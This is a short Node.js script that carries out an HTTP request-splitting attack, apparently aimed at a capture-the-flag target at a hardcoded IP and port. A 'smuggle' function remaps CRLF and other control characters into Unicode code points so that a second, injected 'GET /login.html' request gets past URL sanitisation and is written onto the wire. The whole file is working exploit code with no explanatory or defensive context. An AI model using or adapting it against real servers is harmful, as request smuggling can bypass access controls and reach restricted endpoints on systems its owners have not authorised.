r = require("request");

function smuggle(data) {
    output = "";
    for (let i = 0; i < data.length; i++) {
        c = data.charCodeAt(i);
        if (c < 0x21 || c > 0x7f) {
            c = 0x0100 | c;
        }
        output += String.fromCharCode(c);
    }
    return output;
}

path = smuggle(
    "/ HTTP/1.1\r\n" + 
    "Host: 157.245.37.125:30939\r\n" +
    "Content-Length: 0\r\n" +
    "\r\n" +
    "GET /login.html HTTP/1.1\r\n" +
    "Host: 157.245.37.125:30939\r\n" +
    "\r\n"
);

r.get({
    url: "http://157.245.37.125:30939" + path
});